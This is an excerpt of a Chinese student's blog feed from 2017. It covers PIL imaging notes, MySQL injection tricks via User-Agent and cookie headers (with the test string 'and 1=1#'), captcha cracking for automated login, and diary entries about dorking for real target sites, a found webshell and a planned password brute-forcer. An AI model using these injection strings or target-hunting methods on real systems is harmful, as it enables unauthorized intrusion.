&lt;/code>&lt;/pre>&lt;p>image = image.point(table,’1’)`&lt;/p>
&lt;p>这个例子的结果就是将一张图片里所有灰度值小于180的都变成了黑色（0），其它都变成了像素值为1的颜色。即成了一张灰度图片。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>image.size&lt;/p>
&lt;blockquote>
&lt;p>返回image图像的大小，比如 122 X 54 ，返回格式是 [122,54] 一个list。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image.getpixel( (x,y) )&lt;/p>
&lt;blockquote>
&lt;p>返回image图像坐标(x,y)的灰度值。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image = ImageChops.invert( image )&lt;/p>
&lt;blockquote>
&lt;p>运行结果是将黑白灰度值反转了，结果是 黑白变成了原来的白黑。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image = image.crop( part )&lt;/p>
&lt;blockquote>
&lt;p>此处的part是一个含四个元素的tuple元组。&lt;/p>
&lt;/blockquote>
&lt;p>part = （ 左上角点的x坐标，左上角点的y坐标，右下角点的x坐标，右下角点的y坐标 ）&lt;/p>
&lt;p>返回的是一个原图经过切割，变成part设定的坐标 大小的图片。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>image.show()&lt;/p>
&lt;blockquote>
&lt;p>显示图片&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>image = ImageChops.difference( imbw1 , imbw2 )&lt;/p>
&lt;blockquote>
&lt;p>返回一张image图片，imbw1和imbw2也是图片。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>此函数作用就是将有相同灰度值的像素点 的 灰度值 变为 0（黑） ， 不同灰度值的像素点的 灰度值 变为 255（白）。形成一张image图片返回。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol></description></item><item><title>Mysql的注入姿势集</title><link>https://sera.wang/p/mysql%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E9%9B%86/</link><pubDate>Thu, 30 Nov 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/mysql%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E9%9B%86/</guid><description>&lt;p>一直想找个时间好好整理下搞的这些东西，只能想起来的时候偶尔写一下。&lt;/p>
&lt;p>起因是因为最近看到有个poc利用了报错注入, 而我却发现对它没多少记忆了….就把碰到的都记下来吧..&lt;/p>
&lt;ol>
&lt;li>
&lt;p>http头注入：&lt;/p>
&lt;p>应用场景：某些网站有某些功能，这些功能会收集你的http头信息，带入数据库。&lt;/p>
&lt;p>基本原理：php有个$_SERVER变量可以接收http头的所有信息，它是个数组，具体某个信息比如 User-Agent头，就是 变量 $_SERVER[‘HTTP_USER_AGENT’]。网页某些功能可能会将它带入数据库查询，比如&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/83450459.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>注入测试：利用抓包工具抓包修改User-Agent信息，在后面添加注入语句比如’and 1=1# 完成利用。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Cookie注入：&lt;/p>
&lt;p>应用场景：其实这跟http头注入非常类似，我认为它们的区别在于，cookie注入比http头注入更常见，因为网站经常会验证用户的cookie，来维持登录状态或其他操作。&lt;/p>
&lt;p>基本原理：Cookie也是在http头里的，但独立出$_SERVER数组，cookie中的数据在php中被$_COOKIE变量接收为一个数组。 调用方法 $_SERVER[‘cookiename’] 。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>注入测试：在cookie中找到对应变量，其后添加注入语句。&lt;/p></description></item><item><title>用Python识别验证码</title><link>https://sera.wang/p/%E7%94%A8python%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/</link><pubDate>Thu, 30 Nov 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E7%94%A8python%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>先科普一下几个概念：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>什么是验证码? 为什么要破解它?&lt;/p>
&lt;p>验证码现在很常见，很多网站的用户登录界面都要求输入正确的验证码，它可以通过脚本生成。&lt;/p>
&lt;p>我们写爬虫或者做某些不可描述的事情的时候往往需要登录，有时候验证码很难绕过，但我们又需要让爬虫或者工具能够顺利登录目标网站，所以就需要破解验证码。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>python有个库叫PIL。&lt;/p>
&lt;p>全称”Python Imaging Library”，如你所见，就是python的一个图片处理库。功能非常强大，使用非常方便，所以使用它。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>灰度值&lt;/p>
&lt;p>因为验证码通常是一个图片，所以就必须说明一下这个灰度值的概念。&lt;/p>
&lt;blockquote>
&lt;p>baike: 把白色与黑色之间按对数关系分成若干级,称为“灰度等级”。范围一般从0到255,白色为255,黑色为0,故黑白图片也称灰度图像,在医学、图像识别领域有很广泛的用途。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;h2 id="操作">操作&lt;/h2>
&lt;p>对于目标验证码，采取以下操作：&lt;/p>
&lt;pre tabindex="0">&lt;code>1. 下载验证码图片
2. 对验证码图片进行降噪并切割
3. 根据相似度识别验证码
&lt;/code>&lt;/pre>&lt;p>关门了，先挖好坑，我顺便再研究一波代码；&lt;/p>
&lt;hr>
&lt;p>…好的我回来了&lt;/p>
&lt;p>一晚上的结果，基本对比图库弄出来了&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/52304884.jpg" alt="img" />&lt;/p>
&lt;p>…所以问题你们也发现了吧…400张4位验证码导出来的结果，“0”，“1”，“I”和“L”没有一个命中或者说能被肉眼看出来的…&lt;/p>
&lt;p>有了基本图库，接下来就是通过PIL库的帮助来写 对比像素的”相似度”脚本了。&lt;/p>
&lt;p>思路暂时是这样：&lt;/p>
&lt;p>同时遍历两个目标的图片，像素相同则相似度+1，最后相似度除以像素总数，则得到最后的相似度结果。&lt;/p>
&lt;p>马上要断电了。&lt;/p>
&lt;hr>
&lt;p>12/1&lt;/p>
&lt;p>…
降噪脚本完成 找不到优化的地方&lt;/p>
&lt;p>…
切割脚本简易版完成 找到可以优化的地方了&lt;/p>
&lt;p>…
识别脚本正在写。&lt;/p>
&lt;p>正确率惨不忍睹
D8DH -&amp;gt; U8UH
3JZU -&amp;gt; JJJU
XG5X -&amp;gt; XCJX
95KU -&amp;gt; JJKU&lt;/p>
&lt;p>卧槽不测了，心态炸裂了谢谢。&lt;/p>
&lt;hr>
&lt;p>改了下代码，好多了。&lt;/p>
&lt;p>结果如下图：&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/5608777.jpg" alt="img" />&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/79772032.jpg" alt="img" />&lt;/p>
&lt;p>虽然准确率到了86%, 但与之而来了一个问题…现在验证码越来越高端，这方法对中文根本不适用，然后还有那么多倾斜的验证码，比如：&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/71234879.jpg" alt="img" />&lt;/p>
&lt;p>中文识别就不考虑了，对于倾斜的验证码，想了很多办法最后都是放弃，剩下的一个想法就是让验证码的像素变”细”，这样就好切割验证码了，具体到切割，再到识别，还得把验证码做一次 变细+旋转&lt;/p>
&lt;hr>
&lt;p>折腾一天，现在只想睡觉。&lt;/p>
&lt;p>Sera_Crack v0.9 源代码 ↓&lt;/p>
&lt;p>链接: &lt;a class="link" href="https://pan.baidu.com/s/1dF6gtpB" target="_blank" rel="noopener"
>https://pan.baidu.com/s/1dF6gtpB&lt;/a> 密码: ft46&lt;/p>
&lt;p>先到这里…下次有时间再好好写一写关于验证码识别的。&lt;/p></description></item><item><title>校园杂记10：找站策略+第一次看自(bie)己(ren)拿shell</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B010%E6%89%BE%E7%AB%99%E7%AD%96%E7%95%A5-%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9C%8B%E8%87%AAbie%E5%B7%B1ren%E6%8B%BFshell/</link><pubDate>Sat, 25 Nov 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B010%E6%89%BE%E7%AB%99%E7%AD%96%E7%95%A5-%E7%AC%AC%E4%B8%80%E6%AC%A1%E7%9C%8B%E8%87%AAbie%E5%B7%B1ren%E6%8B%BFshell/</guid><description>&lt;p>最近事情有点多，好久没更。总之，回归安全啦（其实连出发都没出发…&amp;lt;(_ _ )&amp;gt;）&lt;/p>
&lt;hr>
&lt;p>昨天晚上想了想，看了这么久的渗透，但是一直找不到一个合适的站点，很多cms的漏洞自己搭环境测试成功了。那怎么找一个合适的目标来测试一下呢?&lt;/p>
&lt;p>找站策略：&lt;/p>
&lt;ol>
&lt;li>google: search→ Copyright 20xx-20xx [cms名字]&lt;/li>
&lt;li>baidu: site:.cn [关键字，比如”商城”]&lt;/li>
&lt;/ol>
&lt;p>这下应该可以找到合适的target了……先感叹一下以前的自己真是蠢啊…好了我去试一下 ——9：05 am&lt;/p>
&lt;hr>
&lt;p>google失败了, 站也没找到多少个, 为什么shimakaze狗又炸了啊? 好烦啊难道要我自己搭vps了:( ——10:16 am&lt;/p>
&lt;hr>
&lt;p>尝试审计一波tscms，看看能不能找出漏洞来…真是难啊!为什么别人拿shell像喝水一样啊?人是崩溃的. ——12：31 am&lt;/p>
&lt;hr>
&lt;p>… ——14：28 pm&lt;/p>
&lt;hr>
&lt;p>…此处应有表情包，但是找了下没有合适的表情 ——21：53 pm&lt;/p>
&lt;hr>
&lt;p>吼烦, 怎么搞shell这么蛋疼的啊&lt;/p>
&lt;p>键盘一个礼拜还没到, 辣鸡圆通!!!&lt;/p>
&lt;p>我拓麻又坐了一天什么都没干, 挖不到洞好难过啊……&lt;/p>
&lt;hr>
&lt;ol>
&lt;li>周五的时候跟前辈聊了聊, 让我去学java….java….啊&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>记得不久前还说过这辈子都不想学这个语言(叹气), 人生真是艰难啊, 抽个空看一看吧.
&lt;/code>&lt;/pre>&lt;ol>
&lt;li>
&lt;p>噢对了…前几天看学校团委的网站, 它用的tscms，这cms不是那么出名，找个时间读一读源代码，当作第一次代码审计的作业好了。&lt;/p>
&lt;p>随便往学校网站里一看, 重点来了!!! 发现upload/file/下 11月12号有个奇怪的东西, 是个zip…下载下来解压发现是个叫 2013加密.php 的webshell，这是有人想搞事情啊!!!! 花了点钱买了cmd5的积分解密, 一看密码其实隐隐有种感觉，这个人可能是个script kid……算了，脚本小子也比我个没shell的辣鸡强 :(&lt;/p>
&lt;/li>
&lt;li>
&lt;p>卧槽!!!!!!我发现了wooyun的镜像站!!!!!!!捡到宝了!!!!!!&lt;/p>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://wooyun.chamd5.org/index.php" target="_blank" rel="noopener"
>http://wooyun.chamd5.org/index.php&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>接下来又要忙碌起来了, 要干的事:&lt;/p>
&lt;p>① 继续看漏洞试着getshell;&lt;/p>
&lt;p>② 打算用python写个密码爆破工具, 现在密码字典下了一堆,想写个能过验证码的,这周有空的话就开始吧;&lt;/p>
&lt;p>③ 有空再研究一波md5加密算法…话说难道现在的md5都是通过数据库匹配 解密的吗?&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>今天我的键盘就要拿到手了吼吼, 作为入门的搞了个ikbc c87试试水.希望能带来好运(●ˇ∀ˇ●)&lt;/p>
&lt;p>静下心静下心.&lt;/p></description></item><item><title>校园杂记9：成了一个 API Boy</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B09%E6%88%90%E4%BA%86%E4%B8%80%E4%B8%AA-api-boy/</link><pubDate>Sun, 05 Nov 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B09%E6%88%90%E4%BA%86%E4%B8%80%E4%B8%AA-api-boy/</guid><description>&lt;p>因为小挑加了两支队伍，每支都要做一个website←_←&lt;/p>
&lt;p>要做之前，大脑有点空…毕竟不知道多久没有写过js和php了…前段时间的漏洞和各种安全的书看的人头皮发麻.&lt;/p>
&lt;p>总之，重拾开发了…&lt;/p>
&lt;p>两个website大概都算把雏形做好了…&lt;/p>
&lt;p>第一个队伍的，也是自己花了最长时间的(实际上就是今天一天..)，&lt;/p>
&lt;p>链接：&lt;a class="link" href="http://77sera.cn/helpme/" target="_blank" rel="noopener"
>helpme&lt;/a>&lt;/p>
&lt;p>这个废了很多心思啊，画数据库，画布局什么的，我可能是个画家。算了，也当作jquery的第一次实战ww（用jq来写动画效果真的很简单很舒服啊）&lt;/p>
&lt;p>第二个队伍的..花了半小时…装了cms，然后用python改了点页面。还有些深层次要改的话是真的棘手(要研究别人公司的cms代码)，先不管了。&lt;/p>
&lt;p>链接：&lt;a class="link" href="http://77sera.cn/74cms/" target="_blank" rel="noopener"
>经纬智网&lt;/a>&lt;/p>
&lt;hr>
&lt;p>复习是什么?&lt;/p>
&lt;p>我错了。明天开始我会好好复习的T~T&lt;/p>
&lt;p>/ &lt;em>1.
话说双十一买东西谁要一起凑单啊，买书买背包都行啊…&lt;/em> /&lt;/p>
&lt;p>/ &lt;em>2.
逛淘宝页面，看到一本《第一行android》，后来看了眼介绍，原来要用java写，告辞，拒绝三连，不想写java。=A= 谁叫它写个helloworld都那么麻烦&lt;/em> /&lt;/p>
&lt;hr>
&lt;p>补充:&lt;/p>
&lt;p>….想了一下，主开发，副挖洞说不定也很有意思…&lt;/p>
&lt;p>期中考结束的差不多啦!(只剩语文和概率论了)这段时间可以好好放松，愉快的打代码啦(｡･∀･)ﾉﾞ&lt;/p>
&lt;p>下次新开几个坑，一个php的笔记，一个js的笔记，再来个python的笔记…嗯(不管填不填的上，先挖了再说)&lt;/p>
&lt;p>希望自己能静下心来，踏踏实实学…这段时间确实浮躁了不少…稳住啊 19歳…&lt;/p></description></item><item><title>校园杂记8：Sera Crawler v1.0</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B08sera-crawler-v1.0/</link><pubDate>Sat, 28 Oct 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B08sera-crawler-v1.0/</guid><description>&lt;p>今天爬虫君1号v1.0 问世了。&lt;/p>
&lt;p>这爬虫的背景之前提过一点，就是偶尔聊出来的，然后老师似乎想做个收集情报的工具（?）想爬全部中国高校关于某个关键词的信息，于是这东西就这么被我慢慢磨出来了….&lt;/p>
&lt;p>其实爬虫早就写好了，只是猝不及防的一句话
&lt;img src="https://sera.wang/![]%28http:/p6jpvwsnk.bkt.clouddn.com/18-5-21/48241435.jpg%29" alt="img" />&lt;/p>
&lt;p>于是又花了一天看了看官方文档，google百度查tkinter库,弄出来的这个，所以丑的不行是肯定的=。=&lt;/p>
&lt;hr>
&lt;h2 id="使用简要">使用简要：&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>cmd py进入工具页面&lt;/p>
&lt;p>&lt;img src="https://sera.wang/![]%28http:/p6jpvwsnk.bkt.clouddn.com/18-5-21/96040439.jpg%29" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>输入要查询的词&lt;/p>
&lt;p>比如“网络安全”，点search,因为要爬的url有点多，所以等待时间2分钟（其实这里有一个bug等等说）
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/92925654.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>2分钟后（看你网速）结果get&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/50520075.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>双击可以察看details&lt;/p>
&lt;p>&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/77511238.jpg" alt="img" />&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>以上，好像是丑了一点。&lt;/p>
&lt;hr>
&lt;h2 id="接下来会做的优化设想中的">接下来会做的优化（设想中的）：&lt;/h2>
&lt;ol>
&lt;li>可以搜索指定url（不局限于固定url，提升爬行速度）&lt;/li>
&lt;li>加入保存功能&lt;/li>
&lt;li>把url上的文章直接就保存在数据库。&lt;/li>
&lt;li>美化&lt;/li>
&lt;li>前面说了有个bug，就是点完search界面会不能动，直到结果出来，我想了一下，可能这个改进需要改成两个线程。接下来着重看看多线程coding。&lt;/li>
&lt;/ol>
&lt;p>以上，复习当然是不存在的啊。&lt;/p>
&lt;hr>
&lt;p>happy coding ~&lt;/p>
&lt;p>对了对了，这个月学校的安全工作室好像成立了（?）名字叫0Sec，虽然是我起的，但是总觉得哪里不太对劲…（群主让每人说个名字，我说了一个，别人都不说，只好用我的，我能肿么办啊我也很绝望啊）&lt;/p>
&lt;p>欢迎喜欢安全的朋友一起讨论←_←&lt;/p>
&lt;p>噢噢对了，源码分享：&lt;/p>
&lt;p>链接: &lt;a class="link" href="https://pan.baidu.com/s/1slHRpHr" target="_blank" rel="noopener"
>https://pan.baidu.com/s/1slHRpHr&lt;/a> 密码: ef9u&lt;/p></description></item><item><title>校园杂记7：这是我等待爬虫爬完的第三个年头了..</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B07%E8%BF%99%E6%98%AF%E6%88%91%E7%AD%89%E5%BE%85%E7%88%AC%E8%99%AB%E7%88%AC%E5%AE%8C%E7%9A%84%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%B9%B4%E5%A4%B4%E4%BA%86../</link><pubDate>Sun, 22 Oct 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B07%E8%BF%99%E6%98%AF%E6%88%91%E7%AD%89%E5%BE%85%E7%88%AC%E8%99%AB%E7%88%AC%E5%AE%8C%E7%9A%84%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%B9%B4%E5%A4%B4%E4%BA%86../</guid><description>&lt;p>有人问我这几天在干嘛。&lt;/p>
&lt;p>我想了一下，三点一线的日子啊…python，食堂，洗手间，要是有睡袋我可能就睡在电脑前面了吧…&lt;/p>
&lt;p>码字之前，我比较想知道，python是不是光头最快的语言? 不是的话，那今天开始可以是了（雾）…&lt;/p>
&lt;hr>
&lt;p>写代码的时候遇到解决不了的bug翻墙出去搜google 搜stackoverflow 搜github，换了七八个关键词，发现在犄角旮旯里的一个页面里 2006年有一个苦逼问了跟我一样的问题，然后十多年无人回复。&lt;/p>
&lt;p>那时候感觉跨越时空两颗孤独的灵魂相通了……&lt;/p>
&lt;hr>
&lt;p>礼拜一跟老师聊着聊着，&lt;/p>
&lt;blockquote>
&lt;p>这个月你可以帮我写个（爬虫）工具吗，爬全国高校关于网络安全的通知。&lt;/p>
&lt;/blockquote>
&lt;p>毕竟是借给我服务器的老师&amp;hellip; 该打工还是得打，task听上去很简单嘛，我就应了。那天是刚学了python写了个小crawler的第二天。&lt;/p>
&lt;p>第二天把看了两天的core python programming剩下的部分着重看完了，开始看第二本python的书「deep in python crawler」&lt;/p>
&lt;hr>
&lt;p>着重看了crawler部分之后，开始写task的代码了。&lt;/p>
&lt;p>思考了一下，全国高校 网络安全 通知&lt;/p>
&lt;p>全国高校，也就是要爬web上全部的.edu.cn后缀的网站，&lt;/p>
&lt;p>关键词是网络安全和通知，一次正则检索。&lt;/p>
&lt;p>为了省事，我百度了一下高校网址大全，把上面关于中国所有学校的链接爬了下来，放到edulinks.txt里，然后以此开始正式爬取关键词。&lt;/p>
&lt;p>开始之前，总得写个demo吧，于是挑了几个学校的web找找信息，发现信息一点都不友好，每个学校的网站写的都是不一样的。&lt;/p>
&lt;p>我就很奇怪，怎么还有学校的网站是gb2312编码的，爬出来一堆乱码，研究了一晚上request库如何decode和encode，才发现原来可以用requests库一句encoding搞定，utf-8大法好👌&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>于是一晚上就这么没了……&lt;/p>
&lt;hr>
&lt;p>今天想的准确了一点，手头上有了基本的url，思路大概是这样：&lt;/p>
&lt;ol>
&lt;li>待爬取url存进一个urllist列表里，爬取网站下的所有url，写一个筛选函数，把不符合或者重复的url删除，（比如说只能是这个域名下的）&lt;/li>
&lt;li>筛选过的url添加进一个待爬列表，一轮爬取一个&lt;/li>
&lt;li>筛选出关于关键字的信息，添加进一个信息列表，（这个列表是个二维数组，对应是学校名称）&lt;/li>
&lt;/ol>
&lt;p>然后实现过程中，&lt;/p>
&lt;p>报错？ 忽略，try except continue三连&lt;/p>
&lt;p>拒绝访问10054？ 加个time模块，爬一次睡一秒&lt;/p>
&lt;p>invalid error？ 加个UserAgent头再爬&lt;/p>
&lt;p>又是编码？ #coding=utf-8,encoding=’utf-8’&lt;/p>
&lt;p>…&lt;/p>
&lt;p>…&lt;/p>
&lt;p>找不到url?&lt;/p>
&lt;p>我：？？？？？？？？？？？？&lt;/p>
&lt;p>………&lt;/p>
&lt;p>平复了两个小时的心情，分析了一下，一个域名，它下面的有些网站，不会直接在url上显示，学校还好，一般不会加个js动态添加url，但还是有点麻烦，需要手动搜索search关键字，才会跳出那些搜索到的页面，我的爬虫，真的。。。做不到QAQ&lt;/p>
&lt;p>好吧，想了一下，需要再加几个函数……&lt;/p>
&lt;p>思路大概先这样：&lt;/p>
&lt;p>对于一个学校的网站，先正则找到搜索框，然后填数据post过去，也就获取了出现的url了，其中还有很多很多细节要注意..休息一下再想吧…&lt;/p>
&lt;p>…最后说句仿佛很有哲理的话..写代码就像人生，踩得坑多了，人也就歇菜了。&lt;/p></description></item><item><title>校园杂记6：摸了三天的脚本</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B06%E6%91%B8%E4%BA%86%E4%B8%89%E5%A4%A9%E7%9A%84%E8%84%9A%E6%9C%AC/</link><pubDate>Sun, 15 Oct 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B06%E6%91%B8%E4%BA%86%E4%B8%89%E5%A4%A9%E7%9A%84%E8%84%9A%E6%9C%AC/</guid><description>&lt;p>这几天，没上hacking lab，没上sbeam，没上课(一个月扣了四次分..人品不谈了,自律部的同学真是 认 真 啊 !)&lt;/p>
&lt;p>上个礼拜找了几个ctf站想刷刷题，然后找到了经典sql注入练习站redtiger。&lt;/p>
&lt;p>到第三关的时候，hint里说，Try to get an error，好那就让网站报错吧..结果钻牛角尖搞了半天post提交，想让它报一波mysql的错误…&lt;/p>
&lt;p>然而事情并没有这么简单，这道题的目的好像不是让你报mysql的错…&lt;/p>
&lt;p>懵逼了半天，看了一些writeup才知道————这道题其实是想让你报php的错….&lt;/p>
&lt;p>最后改了下get里的参数，报错成功，看到提示了一个文件，好找到这个文件，看了看源代码，嗯是个加密解密算法。&lt;/p>
&lt;p>作者还是挺可爱的，
&lt;img src="http://p6jpvwsnk.bkt.clouddn.com/18-5-21/83271786.jpg" alt="img" />&lt;/p>
&lt;p>于是感觉很爽！加密解密算法都知道了，不是随便注入？&lt;/p>
&lt;p>然后把poc加密了一波，咦？说好的flag呢？&lt;/p>
&lt;p>……并没有flag好吧，纳闷哪里出了问题，google了一波发现，这可能是linux和windows编码问题导致加密解密的php代码运行的结果不一致…..&lt;/p>
&lt;p>于是，咱先搁置一下吧..kali上装notepad还有apache好麻烦的感觉啊QAQ（不就是做不出来放弃了嘛你说这么多干啥）&lt;/p>
&lt;p>下次找个用linux的人问他借下机子跑一跑（借口&lt;/p>
&lt;hr>
&lt;p>最近这段时间越来越发现python方面的知识有点缺:&lt;/p>
&lt;p>第一个原因是之前hacking lab上做脚本题，一开始以为所谓的脚本题是xss，csrf这类的.然而实际上很多题都是用python写个脚本爆破的。
第二个原因是复制黏贴了别人的python脚本，多用了几次发现python真是好用啊&lt;/p>
&lt;p>于是最近看了波python，之前暑假快结束的时候实际上已经学过了python的语法，看了一个《python简明教程》的pdf学的。入门挺好的,现在再来看deeper一点的书就感觉轻松一点。&lt;/p>
&lt;p>今天写了个很简单的爬虫，可能是最简单的那种，只能爬指定url，获取指定data。&lt;/p>
&lt;p>写了个爬虫才发现一些事情，&lt;/p>
&lt;ol>
&lt;li>python写爬虫是真真真真真真真好用!!!!!&lt;/li>
&lt;li>其实python通过url获取到的是类似于网页渲染过后的源码一类的file文件。&lt;/li>
&lt;/ol>
&lt;p>总的来说，发现这块儿挺有意思的哈哈，爬到了数据兴奋了半天。&lt;/p>
&lt;p>话说《python核心编程》这书还是不错的，作者超级萌啊哈哈哈，比如第六章聊到数据库编程的时候，副标题的文本是这样一段话：&lt;/p>
&lt;p>你真的为你儿子起名叫&lt;/p>
&lt;blockquote>
&lt;p>Robert’);DROP TABLE Students;- -&lt;/p>
&lt;/blockquote>
&lt;p>吗？&lt;/p>
&lt;p>hhhhhhh&lt;/p>
&lt;hr>
&lt;p>今天又冒出了几个想法，&lt;/p>
&lt;ol>
&lt;li>
&lt;p>想写个webpage，分享一些pdf..打算用ajax试试看，不知道ajax写文件下载是什么效果。。不好写的话再换php&lt;/p>
&lt;/li>
&lt;li>
&lt;p>上个学期看到有同学发了个查分的exe..c研究的不多，我也没看源码，推测的话感觉不会是爬虫..&lt;/p>
&lt;p>个人感觉应该是从学校服务器上下载的成绩的数据库文件，然后写个c调用数据库查看成绩..于是我想，下次用爬虫爬一波成绩，但是有一个问题就是，&lt;/p>
&lt;p>怎么才能知道全年级学生的密码啊?&lt;/p>
&lt;p>不需要密码的话我也可以写个查分的脚本出来啊。&lt;/p>
&lt;p>这样一想好像也不对，用密码就能看到成绩那还要这个爬虫干嘛…（所以前面都想错了么..）应该是获取成绩的途径不知道，可能是被老师藏在哪个网页里了..好像上学期有人查分也不用密码的..改天问一波再说。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>对于爬虫，还是不清楚这东西具体有个什么用，爬数据？对于我现在用处真不大，或者说只是我个人比较鱼……&lt;/p>
&lt;/li>
&lt;li>
&lt;p>哈哈哈哈一个礼拜前hacking lab上rank到了576(上次看还568呢..看来还是有不少人在做题的QVQ)&lt;/p>
&lt;/li>
&lt;/ol></description></item><item><title>校园杂记5：さらばだ 我的国庆</title><link>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B05%E3%81%95%E3%82%89%E3%81%B0%E3%81%A0-%E6%88%91%E7%9A%84%E5%9B%BD%E5%BA%86/</link><pubDate>Sat, 07 Oct 2017 21:14:23 +0800</pubDate><guid>https://sera.wang/p/%E6%A0%A1%E5%9B%AD%E6%9D%82%E8%AE%B05%E3%81%95%E3%82%89%E3%81%B0%E3%81%A0-%E6%88%91%E7%9A%84%E5%9B%BD%E5%BA%86/</guid><description>&lt;p>愉快的国庆日常，今天睡醒之后看了眼时间，”咦!!! 怎么已经7号了卧槽”&lt;/p>
&lt;p>…….&lt;/p>
&lt;p>好吧，理(ruo)智的大脑提醒我又该写(da)写(da)字(pai)了…&lt;/p>
&lt;hr>
&lt;p>就在放假前一天，sv突然说搞了个跟fsn的联动活动，这我能忍?肯定回归啊! 学习什么的当然是不存在的啊!&lt;/p>
&lt;p>于是国庆长假大概除了和舍友想着今天该吃啥了想一个小时然后果断又点了日常的外卖 还有睡觉，就是打牌了…(sv真好玩我要氪金)&lt;/p>
&lt;p>好吧概率论物理计组是啥都没看，渗透是看完了哈哈哈哈哈哈哈……唉(但是想了想作业全都堆到下礼拜了…)&lt;/p>
&lt;p>国庆偶尔几天玩了玩hacking lab，在上面做了十几道题。做着做着就从2w名到758名了…&lt;/p>
&lt;p>难道说其实后面那1，2万的人就是注册个账号看看好玩的?&lt;/p>
&lt;p>还是有一点小开心的…但是这点开心马上荡然无存啊…英语每学期都要做presentation是什么传统啊。撸了三小时的ppt，嗯就科普一下BeEF吧。&lt;/p>
&lt;hr>
&lt;p>最近，学校的信息安全社团好像要搞起来了的样子，我也发现了一个专业里，其实对安全感兴趣的人还挺多的，开心。&lt;/p>
&lt;p>又有点小纠结，渗透这块难道初中生都能随便玩的吗? 今天看到群里有一个16岁的妹子说自己只会服务器入侵….. 頑張って 19岁 /(ㄒoㄒ)/&lt;/p>
&lt;p>其实仔细想想，渗透只要会点工具，知道一点原理，搜一些漏洞，根据这些漏洞或者原理，拿下一些小站还是很容易的..于是就变成了今天这种渗透人才接近于饱和的局面（雾），都是拿些工具扫一扫，有漏洞，再拿工具注入测试一波，然后拿到数据了，插个马，提个权，控制一波服务器，清个日志美滋滋…&lt;/p>
&lt;p>渗透是挺好入门的，这就跟学一门语言一样，学习后做了点小程序，算入了语言的门了。&lt;/p>
&lt;p>那开发的门入了吗，我想还不够，拿了个webshell，好像是挺厉害，但是这漏洞是自己找的吗，这个站的安全级别怎么样…如果安全级别低，我觉得也体现不了什么水平。&lt;/p>
&lt;p>初级人才饱和，elite还是很缺的…这种情况似乎国内的IT行业都是这样…&lt;/p>
&lt;p>于是，又该思考下一波怎么搞了…我想接下来会多看看别人发布的漏洞…毕竟大牛当年也是菜鸡哈哈哈哈.&lt;/p>
